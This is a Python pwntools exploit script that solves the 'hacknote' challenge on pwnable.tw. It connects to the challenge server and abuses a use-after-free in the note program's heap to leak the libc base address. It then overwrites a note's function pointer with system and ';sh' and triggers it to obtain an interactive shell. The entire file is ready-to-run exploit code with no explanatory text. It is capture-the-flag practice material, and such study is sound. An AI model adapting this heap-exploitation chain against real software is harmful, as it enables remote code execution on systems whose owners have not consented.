#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./hacknote_patched')
libc = ELF('./libc_32.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10102)

def add(sz, data):
    sla('Your choice :', '1')
    sla('Note size :', str(sz))
    sa('Content :', data)

def delete(idx):
    sla('Your choice :', '2')
    sla('Index :', str(idx))

def show(idx):
    sla('Your choice :', '3')
    sla('Index :', str(idx))

# leak libc
add(0x128, '0' * 8) # 0
add(0x8, '1' * 8) # 1
delete(0)
delete(1)
add(0x128, '2' * 4) # 2
show(2)
ru('2' * 4)
libc_base = uu32(r(4)) - 0x1b07b0
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
#binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
#info('binsh = ' + hex(binsh))

# overwrite pointer
add(0x8, up32(system) + ';sh\x00') # 3

#gdb.attach(p, 'b *0x0804892F\nc')

# trigger pointer
input('@')
show(0)

p.interactive()

